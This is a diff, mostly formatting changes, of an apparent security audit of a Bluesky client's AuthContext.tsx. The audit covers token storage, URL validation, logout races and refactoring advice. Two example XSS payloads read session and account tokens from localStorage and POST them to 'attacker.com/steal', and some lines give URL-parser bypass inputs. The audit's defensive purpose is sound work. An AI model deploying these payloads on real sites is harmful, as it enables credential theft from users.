@@ -1,4 +1,5 @@
 # Security Analysis: AuthContext.tsx
+
 **Date:** 2025-12-16
 **Task:** https://app.asana.com/0/1211710875848660/1212467597437955
 **Signal Type:** churn_hotspot
@@ -15,6 +16,7 @@ This security analysis examines `src/contexts/AuthContext.tsx` (662 lines), a hi
 **Overall Risk Assessment:** 🔴 **CRITICAL**
 
 **Key Findings:**
+
 - 🔴 **4 Critical** vulnerabilities requiring immediate remediation
 - 🟡 **5 High** severity issues requiring urgent attention
 - 🟢 **3 Medium** severity concerns for upcoming releases
@@ -75,16 +77,16 @@ Any XSS vulnerability in the application can steal all authentication tokens:
 
 ```javascript
 // Attacker's XSS payload injected via any unvalidated input:
-const session = JSON.parse(localStorage.getItem('bsky_session'));
-const allAccounts = JSON.parse(localStorage.getItem('bsky_accounts'));
+const session = JSON.parse(localStorage.getItem("bsky_session"));
+const allAccounts = JSON.parse(localStorage.getItem("bsky_accounts"));
 
 // Send all credentials to attacker's server
-fetch('https://attacker.com/steal', {
-  method: 'POST',
+fetch("https://attacker.com/steal", {
+  method: "POST",
   body: JSON.stringify({
     current: session,
     accounts: allAccounts, // Steals ALL user accounts at once
-  })
+  }),
 });
 
 // Attacker can now:
@@ -112,13 +114,14 @@ fetch('https://attacker.com/steal', {
 **Required Changes:**
 
 1. **Implement Server-Side Session Management** (Recommended)
+
 ```typescript
 // Architecture change: Backend API handles session tokens
 
 // Frontend: Only store session ID
 interface ClientSession {
-  sessionId: string;  // Opaque identifier only
-  did: string;        // For display purposes
+  sessionId: string; // Opaque identifier only
+  did: string; // For display purposes
   handle: string;
   // NO JWTs on client side
 }
@@ -129,8 +132,9 @@ interface ClientSession {
 ```
 
 2. **If Client-Side Storage Required: Add Encryption**
+
 ```typescript
-import { subtle } from 'crypto';
+import { subtle } from "crypto";
 
 class EncryptedSessionStorage {
   private async deriveKey(password: string): Promise<CryptoKey> {
@@ -140,7 +144,7 @@ class EncryptedSessionStorage {
 
   async saveSession(session: Session): Promise<void> {
     const encrypted = await this.encrypt(JSON.stringify(session));
-    localStorage.setItem('session', encrypted);
+    localStorage.setItem("session", encrypted);
   }
 }
 ```
@@ -202,8 +206,8 @@ await logout();
 
 // Race condition window:
 // If attacker code runs before page reload:
-const stolenSession = localStorage.getItem('bsky_session');
-const stolenAccounts = localStorage.getItem('bsky_accounts');
+const stolenSession = localStorage.getItem("bsky_session");
+const stolenAccounts = localStorage.getItem("bsky_accounts");
 
 // Even after logout completes:
 // - AccountManager.getAllAccounts() may still return data (loaded before clear)
@@ -267,20 +271,21 @@ To make OAuth agents compatible with code expecting `agent.session.did`, the cod
 const sessionCompat = {
   did: oauthState.did,
   handle,
-  accessJwt: "",  // ⚠️ Empty JWTs for OAuth
+  accessJwt: "", // ⚠️ Empty JWTs for OAuth
   refreshJwt: "",
   active: true,
 };
 
 Object.defineProperty(agent, "session", {
   get: () => sessionCompat,
-  configurable: true,  // ⚠️ Property can be reconfigured!
+  configurable: true, // ⚠️ Property can be reconfigured!
 });
 ```
 
 #### Security Issues
 
 1. **Empty JWT Bypass:**
+
 ```typescript
 // Code elsewhere that might check for valid JWT:
 if (agent.session && agent.session.accessJwt) {
@@ -293,6 +298,7 @@ if (agent.session && agent.session.accessJwt) {
 ```
 
 2. **Property Reconfiguration:**
+
 ```typescript
 // Malicious code can redefine the property (configurable: true):
 Object.defineProperty(agent, "session", {
@@ -309,15 +315,16 @@ Object.defineProperty(agent, "session", {
 ```
 
 3. **Memory Leak:**
+
 ```typescript
 // Getter creates NEW object on EVERY access:
 Object.defineProperty(agent, "session", {
-  get: () => sessionCompat,  // New object each time
+  get: () => sessionCompat, // New object each time
 });
 
 // Memory leak if code repeatedly accesses agent.session
 for (let i = 0; i < 10000; i++) {
-  const s = agent.session;  // 10,000 objects created
+  const s = agent.session; // 10,000 objects created
 }
 ```
 
@@ -328,40 +335,44 @@ for (let i = 0; i < 10000; i++) {
 ```typescript
 // Proposed solution: Unified auth interface
 interface AuthAgent {
-  type: 'oauth' | 'app-password';
+  type: "oauth" | "app-password";
   getDid(): string;
   getHandle(): string;
-  getSession(): SessionInfo;  // Normalized session representation
+  getSession(): SessionInfo; // Normalized session representation
   performRequest(req: Request): Promise<Response>;
 }
 
 class OAuthAuthAgent implements AuthAgent {
-  type = 'oauth' as const;
+  type = "oauth" as const;
   constructor(private oauthAgent: OAuthAgent) {}
 
-  getDid(): string { return this.oauthAgent.did; }
+  getDid(): string {
+    return this.oauthAgent.did;
+  }
   getSession(): SessionInfo {
     return {
       did: this.oauthAgent.did,
       handle: this.oauthAgent.handle,
       hasValidCredentials: true,
-      authType: 'oauth',
+      authType: "oauth",
     };
   }
   // No empty JWTs, no Object.defineProperty
 }
 
 class AppPasswordAuthAgent implements AuthAgent {
-  type = 'app-password' as const;
+  type = "app-password" as const;
   constructor(private bskyAgent: BskyAgent) {}
 
-  getDid(): string { return this.bskyAgent.session.did; }
+  getDid(): string {
+    return this.bskyAgent.session.did;
+  }
   getSession(): SessionInfo {
     return {
       did: this.bskyAgent.session.did,
       handle: this.bskyAgent.session.handle,
       hasValidCredentials: !!this.bskyAgent.session.accessJwt,
-      authType: 'app-password',
+      authType: "app-password",
     };
   }
 }
@@ -393,8 +404,7 @@ function isValidPDSUrl(url: string): boolean {
     // ⚠️ Allows ANY subdomain:
     return allowedDomains.some(
       (domain) =>
-        parsed.hostname === domain ||
-        parsed.hostname.endsWith(`.${domain}`)  // ⚠️ Wildcard subdomains!
+        parsed.hostname === domain || parsed.hostname.endsWith(`.${domain}`), // ⚠️ Wildcard subdomains!
     );
   } catch {
     return false;
@@ -405,9 +415,10 @@ function isValidPDSUrl(url: string): boolean {
 #### Attack Scenarios
 
 **Scenario 1: Subdomain Compromise**
+
 ```typescript
 // If attacker controls evil.bsky.social:
-isValidPDSUrl("https://evil.bsky.social")  // ✅ Returns true!
+isValidPDSUrl("https://evil.bsky.social"); // ✅ Returns true!
 
 // User enters credentials
 // Credentials sent to attacker-controlled server
@@ -415,18 +426,20 @@ isValidPDSUrl("https://evil.bsky.social")  // ✅ Returns true!
 ```
 
 **Scenario 2: URL Parser Confusion**
+
 ```typescript
 // Different URL parsers behave differently:
-isValidPDSUrl("https://bsky.social@evil.com")
+isValidPDSUrl("https://bsky.social@evil.com");
 // Might parse as: user=bsky.social, host=evil.com
 // Could bypass validation depending on browser
 
-isValidPDSUrl("https://bsky.social.evil.com")
+isValidPDSUrl("https://bsky.social.evil.com");
 // Might match .bsky.social suffix check
 // But actually routes to evil.com
 ```
 
 **Scenario 3: Client-Side Bypass**
+
 ```typescript
 // Developer tools can modify function:
 window.isValidPDSUrl = () => true;
@@ -447,6 +460,7 @@ await atProtoClient.login(username, password);
 #### Remediation
 
 **Option 1: Remove Custom PDS Support (Recommended)**
+
 ```typescript
 // Remove pdsUrl parameter entirely
 async login(
@@ -465,6 +479,7 @@ async login(
 ```
 
 **Option 2: Server-Side Validation**
+
 ```typescript
 // Backend maintains verified PDS registry
 POST /api/validate-pds
@@ -562,7 +577,7 @@ else {
 
 ```typescript
 // 1. Implement cryptographic session validation
-import { jwtVerify } from 'jose';
+import { jwtVerify } from "jose";
 
 async function validateOAuthSession(session: OAuthSession): Promise<boolean> {
   try {
@@ -577,7 +592,10 @@ async function validateOAuthSession(session: OAuthSession): Promise<boolean> {
 
 // 2. Simplify error handling with explicit error types
 class AuthenticationError extends Error {
-  constructor(message: string, public readonly code: AuthErrorCode) {
+  constructor(
+    message: string,
+    public readonly code: AuthErrorCode,
+  ) {
     super(message);
   }
 }
@@ -638,7 +656,11 @@ JavaScript doesn't have true secure memory, but we can minimize exposure:
 // 1. Clear reference immediately after use
 async function login(identifier: string, password: string): Promise<boolean> {
   try {
-    const result = await atProtoClient.login(identifier, password, authFactorToken);
+    const result = await atProtoClient.login(
+      identifier,
+      password,
+      authFactorToken,
+    );
 
     // Attempt to clear (not guaranteed by JS):
     password = ""; // Clear variable
@@ -651,7 +673,10 @@ async function login(identifier: string, password: string): Promise<boolean> {
 }
 
 // 2. Use Uint8Array for passwords (slightly better than string)
-async function login(identifier: string, passwordBytes: Uint8Array): Promise<boolean> {
+async function login(
+  identifier: string,
+  passwordBytes: Uint8Array,
+): Promise<boolean> {
   try {
     const password = new TextDecoder().decode(passwordBytes);
     const result = await atProtoClient.login(identifier, password);
@@ -713,18 +738,18 @@ A single XSS attack can steal credentials for **ALL** user accounts:
 
 ```javascript
 // Attacker's XSS payload:
-const allAccounts = JSON.parse(localStorage.getItem('bsky_accounts'));
+const allAccounts = JSON.parse(localStorage.getItem("bsky_accounts"));
 
 // Steal all accounts at once
-allAccounts.forEach(account => {
-  fetch('https://attacker.com/steal', {
-    method: 'POST',
+allAccounts.forEach((account) => {
+  fetch("https://attacker.com/steal", {
+    method: "POST",
     body: JSON.stringify({
       did: account.did,
       handle: account.handle,
       accessJwt: account.session.accessJwt,
       refreshJwt: account.session.refreshJwt,
-    })
+    }),
   });
 });
 
@@ -734,6 +759,7 @@ allAccounts.forEach(account => {
 #### Remediation
 
 **Option 1: Don't Store Credentials for Inactive Accounts**
+
 ```typescript
 // Only store metadata, not credentials:
 export interface StoredAccount {
@@ -760,6 +786,7 @@ async switchAccount(did: string): Promise<void> {
 ```
 
 **Option 2: Server-Side Account Switching**
+
 ```typescript
 // Backend maintains multi-account sessions
 POST /api/accounts/switch
@@ -799,7 +826,7 @@ useEffect(() => {
   initializeAuth();
 
   return () => {
-    clearTimeout(safetyTimeout);  // ✅ Clears timeout
+    clearTimeout(safetyTimeout); // ✅ Clears timeout
     // ❌ Doesn't cancel async operations
     // ❌ Doesn't clean up retry timers
     // ❌ Doesn't abort network requests
@@ -840,7 +867,7 @@ useEffect(() => {
       // Pass abort signal to network requests
       const profile = await agent.getProfile(
         { actor: did },
-        { signal: abortController.signal }
+        { signal: abortController.signal },
       );
 
       if (!mounted) return;
@@ -849,7 +876,7 @@ useEffect(() => {
       setIsAuthenticated(true);
       setSession(newSession);
     } catch (error) {
-      if (error.name === 'AbortError') {
+      if (error.name === "AbortError") {
         return; // Component unmounted, ignore
       }
       // Handle other errors
@@ -862,7 +889,7 @@ useEffect(() => {
     mounted = false;
     clearTimeout(safetyTimeout);
     abortController.abort();
-    cleanupFns.forEach(fn => fn());
+    cleanupFns.forEach((fn) => fn());
   };
 }, []);
 ```
@@ -917,11 +944,11 @@ class RetryManager {
 
   async executeWithRetry<T>(
     fn: () => Promise<T>,
-    abortSignal: AbortSignal
+    abortSignal: AbortSignal,
   ): Promise<T> {
     while (this.attempts < this.maxAttempts) {
       if (abortSignal.aborted) {
-        throw new Error('Aborted');
+        throw new Error("Aborted");
       }
 
       try {
@@ -944,7 +971,7 @@ class RetryManager {
       }
     }
 
-    throw new Error('Max retries exceeded');
+    throw new Error("Max retries exceeded");
   }
 
   private openCircuit(): void {
@@ -987,12 +1014,12 @@ window.location.href = "/add-account";
 
 ```typescript
 // Use React Router instead:
-import { useNavigate } from 'react-router-dom';
+import { useNavigate } from "react-router-dom";
 
 const navigate = useNavigate();
 
 // In logout:
-navigate('/', { replace: true });
+navigate("/", { replace: true });
 
 // If full page reload truly needed for security:
 if (requiresFullClear) {
@@ -1004,7 +1031,7 @@ if (requiresFullClear) {
 function validateInternalUrl(url: string): string {
   const parsed = new URL(url, window.location.origin);
   if (parsed.origin !== window.location.origin) {
-    throw new Error('External redirects not allowed');
+    throw new Error("External redirects not allowed");
   }
   return parsed.pathname;
 }
@@ -1035,7 +1062,7 @@ alert("Session expired. Please sign in again.");
 ```typescript
 // Create proper notification system:
 interface SecurityNotification {
-  type: 'session_expired' | 'auth_failed' | 'suspicious_activity';
+  type: "session_expired" | "auth_failed" | "suspicious_activity";
   message: string;
   timestamp: Date;
 }
@@ -1049,13 +1076,13 @@ class SecurityNotifier {
     toast.error(notification.message, {
       persistent: true,
       action: {
-        label: 'Sign In',
-        onClick: () => navigate('/login'),
+        label: "Sign In",
+        onClick: () => navigate("/login"),
       },
     });
 
     // 3. Track metrics
-    analytics.track('security_event', {
+    analytics.track("security_event", {
       type: notification.type,
       timestamp: notification.timestamp,
     });
@@ -1099,7 +1126,7 @@ debug.log("OAuth validation error:", {
 ```typescript
 // 1. Ensure debug is properly disabled in production
 // shared/debug.ts
-const isProduction = process.env.NODE_ENV === 'production';
+const isProduction = process.env.NODE_ENV === "production";
 
 export const debug = {
   log: isProduction ? () => {} : console.log,
@@ -1110,7 +1137,7 @@ export const debug = {
 
 // 2. Sanitize logs to remove sensitive data
 function sanitizeForLog(data: unknown): unknown {
-  if (typeof data === 'object' && data !== null) {
+  if (typeof data === "object" && data !== null) {
     const sanitized = { ...data };
     // Remove sensitive fields
     delete sanitized.accessJwt;
@@ -1131,6 +1158,7 @@ function sanitizeForLog(data: unknown): unknown {
 #### 1. God Object Anti-Pattern
 
 **AuthContext.tsx responsibilities:**
+
 - OAuth authentication flow
 - App-password authentication flow
 - Session management (5 storage locations)
@@ -1156,7 +1184,9 @@ if (mayHaveOAuthSession) {
 const currentAgent = authMethod === "oauth" ? oauthAgent : atProtoClient.agent;
 
 // Compatibility hacks:
-Object.defineProperty(agent, "session", { /* ... */ });
+Object.defineProperty(agent, "session", {
+  /* ... */
+});
 ```
 
 **Impact:** Every feature must handle both auth methods, doubling complexity
@@ -1167,13 +1197,13 @@ Changes to ANY of these services require updating AuthContext:
 
 ```typescript
 // AuthContext.tsx initializes:
-- bookmarkService
-- initializeDataServices
-- dmService
-- appPreferencesService
-- columnService
-- draftService
-- routePrefetchService
+-bookmarkService -
+  initializeDataServices -
+  dmService -
+  appPreferencesService -
+  columnService -
+  draftService -
+  routePrefetchService;
 ```
 
 **Churn Pattern:** Service refactoring → AuthContext must change → Cascading updates
@@ -1192,6 +1222,7 @@ Changes to ANY of these services require updating AuthContext:
 #### 5. Technical Debt Accumulation
 
 **Evidence from code comments:**
+
 ```typescript
 // Line 48: "Legacy app password login (kept for backwards compatibility)"
 // Line 271: "IMPORTANT: This must be done BEFORE initializing services"
@@ -1199,6 +1230,7 @@ Changes to ANY of these services require updating AuthContext:
 ```
 
 **Implications:**
+
 - Can't remove old code (backward compatibility)
 - Must work around design decisions
 - Accumulating workarounds and special cases
@@ -1213,7 +1245,7 @@ Changes to ANY of these services require updating AuthContext:
 // Proposed architecture:
 
 interface AuthStrategy {
-  readonly type: 'oauth' | 'app-password';
+  readonly type: "oauth" | "app-password";
   login(...args: unknown[]): Promise<Session>;
   logout(): Promise<void>;
   refresh(): Promise<Session>;
@@ -1222,7 +1254,7 @@ interface AuthStrategy {
 }
 
 class OAuthStrategy implements AuthStrategy {
-  readonly type = 'oauth';
+  readonly type = "oauth";
 
   constructor(private oauthService: OAuthService) {}
 
@@ -1235,7 +1267,7 @@ class OAuthStrategy implements AuthStrategy {
 }
 
 class AppPasswordStrategy implements AuthStrategy {
-  readonly type = 'app-password';
+  readonly type = "app-password";
 
   constructor(private client: ATProtoClient) {}
 
@@ -1257,6 +1289,7 @@ class AuthContext {
 ```
 
 **Benefits:**
+
 - Each auth method isolated
 - No more compatibility hacks
 - Easy to add new auth methods
@@ -1274,7 +1307,7 @@ interface SessionStorage {
 class SessionManager {
   constructor(
     private storage: SessionStorage,
-    private listeners: Set<SessionListener>
+    private listeners: Set<SessionListener>,
   ) {}
 
   async setSession(session: Session | null): Promise<void> {
@@ -1292,6 +1325,7 @@ class SessionManager {
 ```
 
 **Benefits:**
+
 - Single storage location
 - No synchronization bugs
 - Easy to add encryption
@@ -1314,19 +1348,20 @@ class ServiceRegistry {
 
   async initializeAll(agent: BskyAgent): Promise<void> {
     await Promise.all(
-      Array.from(this.services.values()).map(s => s.setAgent(agent))
+      Array.from(this.services.values()).map((s) => s.setAgent(agent)),
     );
   }
 
   async shutdownAll(): Promise<void> {
     await Promise.all(
-      Array.from(this.services.values()).map(s => s.shutdown())
+      Array.from(this.services.values()).map((s) => s.shutdown()),
     );
   }
 }
 ```
 
 **Benefits:**
+
 - Services decouple from AuthContext
 - Service changes don't affect auth
 - Easy to add/remove services
@@ -1336,16 +1371,16 @@ class ServiceRegistry {
 
 ```typescript
 type AuthState =
-  | { status: 'initializing' }
-  | { status: 'unauthenticated' }
-  | { status: 'authenticated'; session: Session; agent: BskyAgent }
-  | { status: 'error'; error: Error; canRetry: boolean };
+  | { status: "initializing" }
+  | { status: "unauthenticated" }
+  | { status: "authenticated"; session: Session; agent: BskyAgent }
+  | { status: "error"; error: Error; canRetry: boolean };
 
 type AuthAction =
-  | { type: 'INIT_SUCCESS'; session: Session; agent: BskyAgent }
-  | { type: 'INIT_FAILURE'; error: Error }
-  | { type: 'LOGOUT' }
-  | { type: 'SESSION_EXPIRED' };
+  | { type: "INIT_SUCCESS"; session: Session; agent: BskyAgent }
+  | { type: "INIT_FAILURE"; error: Error }
+  | { type: "LOGOUT" }
+  | { type: "SESSION_EXPIRED" };
 
 function authReducer(state: AuthState, action: AuthAction): AuthState {
   // Explicit state transitions
@@ -1354,6 +1389,7 @@ function authReducer(state: AuthState, action: AuthAction): AuthState {
 ```
 
 **Benefits:**
+
 - Predictable state transitions
 - Easier to test
 - Eliminates race conditions
@@ -1425,20 +1461,20 @@ function authReducer(state: AuthState, action: AuthAction): AuthState {
 
 ```typescript
 // 1. XSS Token Theft Prevention
-describe('Session Security', () => {
-  it('should not expose JWTs to JavaScript', () => {
+describe("Session Security", () => {
+  it("should not expose JWTs to JavaScript", () => {
     loginUser();
 
     // Attempt to access via localStorage
-    expect(localStorage.getItem('bsky_session')).toBeNull();
+    expect(localStorage.getItem("bsky_session")).toBeNull();
 
     // Attempt to access via document.cookie
-    const cookies = document.cookie.split(';');
-    const sessionCookie = cookies.find(c => c.includes('session'));
+    const cookies = document.cookie.split(";");
+    const sessionCookie = cookies.find((c) => c.includes("session"));
     expect(sessionCookie).toBeUndefined(); // HttpOnly means not accessible
   });
 
-  it('should encrypt stored sessions', async () => {
+  it("should encrypt stored sessions", async () => {
     await loginUser();
 
     const stored = await sessionStorage.getEncrypted();
@@ -1447,19 +1483,19 @@ describe('Session Security', () => {
 });
 
 // 2. Logout Completeness
-describe('Logout', () => {
-  it('should clear ALL session storage locations', async () => {
+describe("Logout", () => {
+  it("should clear ALL session storage locations", async () => {
     await loginUser();
     await logout();
 
     // Verify all locations cleared
-    expect(getCookie('bsky_session')).toBeNull();
-    expect(localStorage.getItem('bsky_session')).toBeNull();
-    expect(await getFromIndexedDB('session')).toBeNull();
+    expect(getCookie("bsky_session")).toBeNull();
+    expect(localStorage.getItem("bsky_session")).toBeNull();
+    expect(await getFromIndexedDB("session")).toBeNull();
     expect(AccountManager.getAllAccounts()).toEqual([]);
   });
 
-  it('should invalidate all service agents', async () => {
+  it("should invalidate all service agents", async () => {
     await loginUser();
     await logout();
 
@@ -1471,52 +1507,52 @@ describe('Logout', () => {
 });
 
 // 3. OAuth/App-Password Isolation
-describe('Auth Method Isolation', () => {
-  it('should not allow OAuth session with app-password methods', async () => {
+describe("Auth Method Isolation", () => {
+  it("should not allow OAuth session with app-password methods", async () => {
     await loginWithOAuth();
 
     // Should not be able to call app-password methods
     await expect(atProtoClient.refreshSession()).rejects.toThrow();
   });
 
-  it('should use correct session format for each auth method', async () => {
+  it("should use correct session format for each auth method", async () => {
     await loginWithOAuth();
     const oauthSession = getSession();
-    expect(oauthSession.type).toBe('oauth');
+    expect(oauthSession.type).toBe("oauth");
 
     await logout();
     await loginWithAppPassword();
     const appPasswordSession = getSession();
-    expect(appPasswordSession.type).toBe('app-password');
+    expect(appPasswordSession.type).toBe("app-password");
   });
 });
 
 // 4. PDS URL Validation
-describe('PDS URL Validation', () => {
-  it('should reject subdomain attacks', () => {
-    expect(isValidPDSUrl('https://evil.bsky.social')).toBe(false);
+describe("PDS URL Validation", () => {
+  it("should reject subdomain attacks", () => {
+    expect(isValidPDSUrl("https://evil.bsky.social")).toBe(false);
   });
 
-  it('should reject URL parser attacks', () => {
-    expect(isValidPDSUrl('https://bsky.social@evil.com')).toBe(false);
-    expect(isValidPDSUrl('https://bsky.social.evil.com')).toBe(false);
+  it("should reject URL parser attacks", () => {
+    expect(isValidPDSUrl("https://bsky.social@evil.com")).toBe(false);
+    expect(isValidPDSUrl("https://bsky.social.evil.com")).toBe(false);
   });
 
-  it('should only accept exact domain matches', () => {
-    expect(isValidPDSUrl('https://bsky.social')).toBe(true);
-    expect(isValidPDSUrl('https://bsky.app')).toBe(true);
+  it("should only accept exact domain matches", () => {
+    expect(isValidPDSUrl("https://bsky.social")).toBe(true);
+    expect(isValidPDSUrl("https://bsky.app")).toBe(true);
   });
 });
 
 // 5. Race Condition Testing
-describe('Concurrent Auth Operations', () => {
-  it('should handle concurrent login/logout without corruption', async () => {
+describe("Concurrent Auth Operations", () => {
+  it("should handle concurrent login/logout without corruption", async () => {
     const operations = [
-      login('user1', 'pass1'),
+      login("user1", "pass1"),
       logout(),
-      login('user2', 'pass2'),
+      login("user2", "pass2"),
       logout(),
-      login('user3', 'pass3'),
+      login("user3", "pass3"),
     ];
 
     await Promise.allSettled(operations);
@@ -1526,14 +1562,14 @@ describe('Concurrent Auth Operations', () => {
     expect(state.isConsistent()).toBe(true);
   });
 
-  it('should cancel in-flight requests on logout', async () => {
-    const loginPromise = login('user', 'pass');
+  it("should cancel in-flight requests on logout", async () => {
+    const loginPromise = login("user", "pass");
 
     // Logout before login completes
     await logout();
 
     // Login should be cancelled
-    await expect(loginPromise).rejects.toThrow('Aborted');
+    await expect(loginPromise).rejects.toThrow("Aborted");
   });
 });
 ```
@@ -1542,12 +1578,12 @@ describe('Concurrent Auth Operations', () => {
 
 ```typescript
 // 6. Memory Leak Detection
-describe('Memory Management', () => {
-  it('should not leak memory on repeated login/logout', async () => {
+describe("Memory Management", () => {
+  it("should not leak memory on repeated login/logout", async () => {
     const initialMemory = performance.memory.usedJSHeapSize;
 
     for (let i = 0; i < 100; i++) {
-      await login('user', 'pass');
+      await login("user", "pass");
       await logout();
     }
 
@@ -1563,8 +1599,8 @@ describe('Memory Management', () => {
 });
 
 // 7. Initialization Performance
-describe('Auth Initialization', () => {
-  it('should complete initialization within 2 seconds', async () => {
+describe("Auth Initialization", () => {
+  it("should complete initialization within 2 seconds", async () => {
     const start = Date.now();
 
     await initializeAuth();
@@ -1573,7 +1609,7 @@ describe('Auth Initialization', () => {
     expect(duration).toBeLessThan(2000);
   });
 
-  it('should not block UI thread', async () => {
+  it("should not block UI thread", async () => {
     let uiBlocked = false;
 
     const checkUI = setInterval(() => {
@@ -1599,23 +1635,23 @@ describe('Auth Initialization', () => {
 // Security metrics to implement:
 const securityMetrics = {
   // Authentication metrics
-  loginAttempts: counter('login_attempts', ['status', 'method']),
-  loginDuration: histogram('login_duration_ms', ['method']),
-  sessionValidationFailures: counter('session_validation_failures', ['reason']),
+  loginAttempts: counter("login_attempts", ["status", "method"]),
+  loginDuration: histogram("login_duration_ms", ["method"]),
+  sessionValidationFailures: counter("session_validation_failures", ["reason"]),
 
   // Session management metrics
-  activeSessions: gauge('active_sessions'),
-  sessionDuration: histogram('session_duration_minutes'),
-  concurrentSessions: histogram('concurrent_sessions_per_user'),
+  activeSessions: gauge("active_sessions"),
+  sessionDuration: histogram("session_duration_minutes"),
+  concurrentSessions: histogram("concurrent_sessions_per_user"),
 
   // Security event metrics
-  xssAttempts: counter('xss_attempts_detected'),
-  invalidatedSessions: counter('invalidated_sessions', ['reason']),
-  suspiciousActivity: counter('suspicious_activity', ['type']),
+  xssAttempts: counter("xss_attempts_detected"),
+  invalidatedSessions: counter("invalidated_sessions", ["reason"]),
+  suspiciousActivity: counter("suspicious_activity", ["type"]),
 
   // Performance metrics
-  authInitDuration: histogram('auth_init_duration_ms'),
-  serviceInitDuration: histogram('service_init_duration_ms'),
+  authInitDuration: histogram("auth_init_duration_ms"),
+  serviceInitDuration: histogram("service_init_duration_ms"),
 };
 ```
 
@@ -1625,28 +1661,28 @@ const securityMetrics = {
 const alerts = {
   // Critical alerts (immediate response)
   highFailureRate: {
-    condition: 'login_failures > 100 in 5min',
-    severity: 'critical',
-    action: 'Potential brute force attack',
+    condition: "login_failures > 100 in 5min",
+    severity: "critical",
+    action: "Potential brute force attack",
   },
 
   massSessionInvalidation: {
-    condition: 'invalidated_sessions > 1000 in 10min',
-    severity: 'critical',
-    action: 'Potential security incident',
+    condition: "invalidated_sessions > 1000 in 10min",
+    severity: "critical",
+    action: "Potential security incident",
   },
 
   // Warning alerts
   slowAuthInit: {
-    condition: 'p95(auth_init_duration_ms) > 5000 for 10min',
-    severity: 'warning',
-    action: 'Performance degradation',
+    condition: "p95(auth_init_duration_ms) > 5000 for 10min",
+    severity: "warning",
+    action: "Performance degradation",
   },
 
   increasedValidationFailures: {
-    condition: 'session_validation_failures > baseline * 2',
-    severity: 'warning',
-    action: 'Investigate session issues',
+    condition: "session_validation_failures > baseline * 2",
+    severity: "warning",
+    action: "Investigate session issues",
   },
 };
 ```
@@ -1657,27 +1693,27 @@ const alerts = {
 
 ### OWASP Top 10 2021 Mapping
 
-| OWASP Category | Current Status | Issues | Priority |
-|----------------|---------------|--------|----------|
-| A01: Broken Access Control | 🔴 Critical | Multiple storage locations, state desync | P0 |
-| A02: Cryptographic Failures | 🔴 Critical | No token encryption, plaintext storage | P0 |
-| A03: Injection | 🟡 Medium | XSS enables token theft | P1 |
-| A04: Insecure Design | 🔴 Critical | Tight coupling, god object | P0 |
-| A05: Security Misconfiguration | 🟡 Medium | Missing security headers | P2 |
-| A07: Identification & Auth Failures | 🔴 Critical | Token exposure, weak validation | P0 |
-| A09: Security Logging Failures | 🟡 Medium | Insufficient audit trail | P1 |
+| OWASP Category                      | Current Status | Issues                                   | Priority |
+| ----------------------------------- | -------------- | ---------------------------------------- | -------- |
+| A01: Broken Access Control          | 🔴 Critical    | Multiple storage locations, state desync | P0       |
+| A02: Cryptographic Failures         | 🔴 Critical    | No token encryption, plaintext storage   | P0       |
+| A03: Injection                      | 🟡 Medium      | XSS enables token theft                  | P1       |
+| A04: Insecure Design                | 🔴 Critical    | Tight coupling, god object               | P0       |
+| A05: Security Misconfiguration      | 🟡 Medium      | Missing security headers                 | P2       |
+| A07: Identification & Auth Failures | 🔴 Critical    | Token exposure, weak validation          | P0       |
+| A09: Security Logging Failures      | 🟡 Medium      | Insufficient audit trail                 | P1       |
 
 ### OAuth 2.0 Security Best Practices (RFC 8252, RFC 8725)
 
-| Best Practice | Implemented | Notes |
-|---------------|-------------|-------|
-| Authorization Code Flow with PKCE | ✅ Yes | Using @atproto/oauth-client-browser |
-| State parameter validation | ✅ Yes | Library handles this |
-| Nonce parameter | ❓ Unknown | Need to verify |
-| Token storage in secure location | ❌ No | Stored in localStorage (insecure) |
-| Token rotation on refresh | ❓ Unknown | Need to verify |
-| Short-lived access tokens | ❓ Unknown | Depends on server config |
-| HTTPS only | ✅ Yes | Enforced in validation |
+| Best Practice                     | Implemented | Notes                               |
+| --------------------------------- | ----------- | ----------------------------------- |
+| Authorization Code Flow with PKCE | ✅ Yes      | Using @atproto/oauth-client-browser |
+| State parameter validation        | ✅ Yes      | Library handles this                |
+| Nonce parameter                   | ❓ Unknown  | Need to verify                      |
+| Token storage in secure location  | ❌ No       | Stored in localStorage (insecure)   |
+| Token rotation on refresh         | ❓ Unknown  | Need to verify                      |
+| Short-lived access tokens         | ❓ Unknown  | Depends on server config            |
+| HTTPS only                        | ✅ Yes      | Enforced in validation              |
 
 ### CWE (Common Weakness Enumeration) Coverage
 
